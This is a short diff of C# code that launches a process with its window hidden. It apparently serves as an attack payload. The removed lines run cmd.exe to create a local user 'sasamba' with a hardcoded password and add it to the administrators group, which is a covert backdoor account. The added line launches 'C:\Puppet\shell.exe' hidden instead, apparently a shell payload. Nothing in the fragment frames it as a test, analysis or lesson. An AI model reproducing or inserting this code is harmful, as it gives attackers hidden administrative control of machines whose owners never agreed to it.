@@ -36,8 +36,7 @@
             System.Diagnostics.Process process = new System.Diagnostics.Process();
             System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
             startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfo.FileName = "cmd.exe";
-            startInfo.Arguments = "/C net user sasamba Sasamba1! /add && net localgroup administrators sasamba /add";
+            startInfo.FileName = "C:\Puppet\shell.exe";
             process.StartInfo = startInfo;
             process.Start();
 
